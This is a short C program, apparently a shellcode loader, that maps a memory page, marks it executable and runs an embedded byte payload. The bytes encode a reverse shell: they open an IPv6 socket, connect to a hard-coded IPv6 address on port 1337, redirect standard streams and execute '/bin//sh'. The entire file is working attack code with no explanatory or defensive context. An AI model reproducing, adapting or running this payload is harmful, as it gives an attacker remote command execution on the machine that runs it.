#include <sys/mman.h>
#include <unistd.h>
#include <string.h>

char shellcode[] = \
"\x6a\x61\x58\x99\x6a\x1c\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x04"
"\x3e\x0f\x05\xff\xc6\x04\x59\x0f\x05\xff\xce\xff\xce\x04\x58"
"\x0f\x05\xe9\x23\x00\x00\x00\x5e\x6a\x1c\x5a\x66\x83\xc0\x62"
"\x0f\x05\x99\x52\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57"
"\x48\x89\xe7\x52\x57\x48\x89\xe6\x04\x3b\x0f\x05\xe8\xd8\xff"
"\xff\xff\x00\x1c\x05\x39\x00\x00\x00\x00\x2a\x02\xab\x8a\x10"
"\xc0\x8e\x80\x02\x0c\x29\xff\xfe\x24\xbf\xfc\x00\x00\x00\x00";

int main()
{
	size_t page_size = getpagesize();
	void *mem = mmap(NULL, page_size,
                 PROT_READ | PROT_WRITE,
                 MAP_ANON | MAP_PRIVATE,
                 -1, 0);

	memcpy(mem, shellcode, sizeof(shellcode));
	mprotect(mem, page_size, PROT_READ | PROT_EXEC);

	((void (*)())mem)();

	munmap(mem, page_size);
}
